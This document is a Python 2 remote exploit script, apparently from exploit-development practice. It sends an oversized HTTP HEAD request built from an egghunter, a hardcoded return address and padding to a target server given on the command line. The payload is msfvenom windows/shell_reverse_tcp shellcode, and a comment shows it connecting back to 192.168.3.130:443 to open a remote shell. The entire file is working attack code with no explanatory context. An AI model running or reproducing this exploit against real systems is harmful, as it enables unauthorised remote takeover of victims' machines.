from socket import create_connection as cc
import sys
import struct

# 32 Bytes egghunter
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a" #W00T
	"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
	"\xef\xb8\x54\x30\x30\x57\x8b\xfa"
	"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

def p(a):
	return struct.pack("I", a)

def attack(target, evil):
	target.send(evil)

if __name__ == "__main__":

	if not len(sys.argv) == 3:
		print "[*] USAGE: {0} TARGET_IP PORT".format(sys.argv[0])
		sys.exit()

	HOST = str(sys.argv[1])
	PORT = int(sys.argv[2])

	try:
		target = cc((HOST, PORT))
	except:
		print "[-] Unable to connect to target ip.\n[-] Aborting Exploit\n"
		sys.exit()

	print "[+] Connected to target machine\n"

	#00435994
	#SEH = "\x94\x59\x43"
	#nSEH = "CCCC"

	#Stage1 = "A"*482 + nSEH + SEH + "D"*610

	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 EXITFUNC=thread -f c -b "\x00\x0d\x0a\x3d\x20\x3f" -e x86/shikata_ga_nai
	# 351 Bytes
	shellcode = ("\xba\x43\x10\x16\x12\xda\xca\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\x15\x1e\xf4\xe7\x65\xf6\x7a"
"\x07\x95\x07\x1b\x81\x70\x36\x1b\xf5\xf1\x69\xab\x7d\x57\x86"
"\x40\xd3\x43\x1d\x24\xfc\x64\x96\x83\xda\x4b\x27\xbf\x1f\xca"
"\xab\xc2\x73\x2c\x95\x0c\x86\x2d\xd2\x71\x6b\x7f\x8b\xfe\xde"
"\x6f\xb8\x4b\xe3\x04\xf2\x5a\x63\xf9\x43\x5c\x42\xac\xd8\x07"
"\x44\x4f\x0c\x3c\xcd\x57\x51\x79\x87\xec\xa1\xf5\x16\x24\xf8"
"\xf6\xb5\x09\x34\x05\xc7\x4e\xf3\xf6\xb2\xa6\x07\x8a\xc4\x7d"
"\x75\x50\x40\x65\xdd\x13\xf2\x41\xdf\xf0\x65\x02\xd3\xbd\xe2"
"\x4c\xf0\x40\x26\xe7\x0c\xc8\xc9\x27\x85\x8a\xed\xe3\xcd\x49"
"\x8f\xb2\xab\x3c\xb0\xa4\x13\xe0\x14\xaf\xbe\xf5\x24\xf2\xd6"
"\x3a\x05\x0c\x27\x55\x1e\x7f\x15\xfa\xb4\x17\x15\x73\x13\xe0"
"\x5a\xae\xe3\x7e\xa5\x51\x14\x57\x62\x05\x44\xcf\x43\x26\x0f"
"\x0f\x6b\xf3\x80\x5f\xc3\xac\x60\x0f\xa3\x1c\x09\x45\x2c\x42"
"\x29\x66\xe6\xeb\xc0\x9d\x61\xd4\xbd\x9e\xf3\xbc\xbf\xa0\xf2"
"\x87\x49\x46\x9e\xe7\x1f\xd1\x37\x91\x05\xa9\xa6\x5e\x90\xd4"
"\xe9\xd5\x17\x29\xa7\x1d\x5d\x39\x50\xee\x28\x63\xf7\xf1\x86"
"\x0b\x9b\x60\x4d\xcb\xd2\x98\xda\x9c\xb3\x6f\x13\x48\x2e\xc9"
"\x8d\x6e\xb3\x8f\xf6\x2a\x68\x6c\xf8\xb3\xfd\xc8\xde\xa3\x3b"
"\xd0\x5a\x97\x93\x87\x34\x41\x52\x7e\xf7\x3b\x0c\x2d\x51\xab"
"\xc9\x1d\x62\xad\xd5\x4b\x14\x51\x67\x22\x61\x6e\x48\xa2\x65"
"\x17\xb4\x52\x89\xc2\x7c\x62\xc0\x4e\xd4\xeb\x8d\x1b\x64\x76"
"\x2e\xf6\xab\x8f\xad\xf2\x53\x74\xad\x77\x51\x30\x69\x64\x2b"
"\x29\x1c\x8a\x98\x4a\x35")

	ret = p(0x774699BF)
	Stage1 = "\x90"*10 + "T00WT00W" + shellcode + "A"*(515-351-10-8) + ret + "\x90"*8 + egghunter + "\x90"*41
	buffer = ("HEAD /" + Stage1 + " HTTP/1.1\r\n"
		  "Host: 192.168.111.128:8080\r\n"
		  "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
		  "Keep-Alive: 115\r\n"
		  "Connection: keep-alive\r\n\r\n")

	attack(target, buffer)
	target.close()
